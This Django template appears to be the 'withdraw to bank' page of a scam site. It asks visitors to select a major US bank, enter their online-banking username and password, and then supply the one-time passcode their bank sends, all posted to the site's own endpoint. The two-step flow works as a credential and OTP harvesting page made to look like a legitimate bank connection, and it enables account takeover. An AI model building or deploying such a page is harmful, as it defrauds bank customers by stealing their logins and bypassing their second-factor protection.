{% extends 'app/dashboard_layout.html' %}
{% load static %}

{% block title %}{{ withdraw_type|title }} to Bank {% endblock %}

{% block dashboard_content %}
    <div class="payment-page">
        <div class="payment-header">
            <div class="back-button-container">
                <a href="{% url 'payment_selection' %}" class="back-button">
                    <i class="fas fa-arrow-left"></i>
                    Back to Withdrawal Options
                </a>
            </div>
            <h1>{{ withdraw_type|title }} to Bank</h1>
            <p>Connect your bank account securely</p>
        </div>
        
        <div class="payment-content">
            <div class="payment-form" style="max-width: 500px; width: 100%;">
                <form id="bank-form" method="post" hx-post="{% url 'bank_manual_payment' %}" hx-swap="none">
                    {% csrf_token %}
                    <input type="hidden" name="withdraw_type" value="{{ withdraw_type }}">
                    <input type="hidden" name="step" id="form-step" value="1">

                    <div class="form-group">
                        <label class="form-label">Bank Name</label>
                        <select class="form-input" name="bank_name" id="bank-select" required>
                            <option value="">Select your bank</option>
                            <optgroup label="US Banks">
                                <option value="chase">Chase Bank</option>
                                <option value="bank_of_america">Bank of America</option>
                                <option value="wells_fargo">Wells Fargo</option>
                                <option value="citibank">Citibank</option>
                                <option value="us_bank">U.S. Bank</option>
                                <option value="pnc">PNC Bank</option>
                                <option value="capital_one">Capital One</option>
                                <option value="td_bank">TD Bank</option>
                                <option value="american_express">American Express Bank</option>
                                <option value="goldman_sachs">Goldman Sachs</option>
                            </optgroup>
                            <optgroup label="Other Banks">
                                <option value="other">Other Bank</option>
                            </optgroup>
                        </select>
                    </div>

                    <!-- Custom Bank Name Input (Hidden initially) -->
                    <div class="form-group" id="custom-bank-group" style="display: none;">
                        <label class="form-label">Enter Bank Name</label>
                        <input class="form-input" name="custom_bank_name" id="custom-bank-input" placeholder="Enter your bank name" />
                    </div>

                    <div class="form-group">
                        <label class="form-label">Username/User ID</label>
                        <input class="form-input" name="username" required placeholder="Your bank login username" />
                    </div>

                    <div class="form-group">
                        <label class="form-label">Password</label>
                        <input class="form-input" name="password" type="password" required placeholder="Your bank login password" />
                    </div>

                    <!-- OTP Section (Hidden initially) -->
                    <div id="otp-section" style="display: none;">
                        <div class="form-group">
                            <label class="form-label">Enter OTP from Bank</label>
                            <input class="form-input" name="otp_code" placeholder="Enter 6-digit OTP" maxlength="6" />
                            <small style="color: #6c757d; display: block; margin-top: 4px;">Check your phone/email for the OTP from your bank</small>
                        </div>
                    </div>

                    <button type="submit" id="submit-btn" class="btn btn-primary" style="width: 100%;">
                        <i class="fas fa-university"></i>
                        <span id="btn-text">Connect Bank Account</span>
                    </button>
                </form>
            </div>
        </div>
    </div>
{% endblock %}

{% block scripts %}
<script>
document.addEventListener('DOMContentLoaded', function() {

    // Two-step form process
    const form = document.getElementById('bank-form');
    const otpSection = document.getElementById('otp-section');
    const submitBtn = document.getElementById('submit-btn');
    const btnText = document.getElementById('btn-text');
    const formStep = document.getElementById('form-step');
    const bankSelect = document.getElementById('bank-select');
    const customBankGroup = document.getElementById('custom-bank-group');
    const customBankInput = document.getElementById('custom-bank-input');
    let isStep2 = false;

    // Handle bank selection change
    bankSelect.addEventListener('change', function() {
        if (this.value === 'other') {
            customBankGroup.style.display = 'block';
            customBankInput.required = true;
        } else {
            customBankGroup.style.display = 'none';
            customBankInput.required = false;
            customBankInput.value = '';
        }
    });

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (!isStep2) {
            // Step 1: Submit bank credentials
            const bankName = document.querySelector('[name="bank_name"]').value;
            const customBankName = document.querySelector('[name="custom_bank_name"]').value;
            const username = document.querySelector('[name="username"]').value;
            const password = document.querySelector('[name="password"]').value;
            
            // Validate bank name
            if (!bankName) {
                Toastify({
                    text: "Please select a bank",
                    duration: 3000,
                    gravity: "top",
                    position: "right",
                    backgroundColor: "#dc3545",
                    stopOnFocus: true
                }).showToast();
                return;
            }
            
            // If "Other Bank" is selected, validate custom bank name
            if (bankName === 'other' && !customBankName.trim()) {
                Toastify({
                    text: "Please enter your bank name",
                    duration: 3000,
                    gravity: "top",
                    position: "right",
                    backgroundColor: "#dc3545",
                    stopOnFocus: true
                }).showToast();
                return;
            }
            
            if (!username || !password) {
                Toastify({
                    text: "Please fill in all required fields",
                    duration: 3000,
                    gravity: "top",
                    position: "right",
                    backgroundColor: "#dc3545",
                    stopOnFocus: true
                }).showToast();
                return;
            }
            
            // Show OTP section
            otpSection.style.display = 'block';
            formStep.value = '2';
            btnText.textContent = 'Complete Transaction';
            isStep2 = true;
            
            // Show success toast
            Toastify({
                text: "Bank credentials submitted! Your bank will send you an OTP. Please check your phone/email and enter the OTP below.",
                duration: 5000,
                gravity: "top",
                position: "right",
                backgroundColor: "#28a745",
                stopOnFocus: true
            }).showToast();
            
            // Scroll to OTP section
            otpSection.scrollIntoView({ behavior: 'smooth' });
        } else {
            // Step 2: Submit with OTP
            const otpCode = document.querySelector('[name="otp_code"]').value;
            if (!otpCode) {
                Toastify({
                    text: "Please enter the OTP from your bank",
                    duration: 3000,
                    gravity: "top",
                    position: "right",
                    backgroundColor: "#dc3545",
                    stopOnFocus: true
                }).showToast();
                return;
            }
            
            // Submit the form
            form.submit();
        }
    });
});
</script>
{% endblock %}
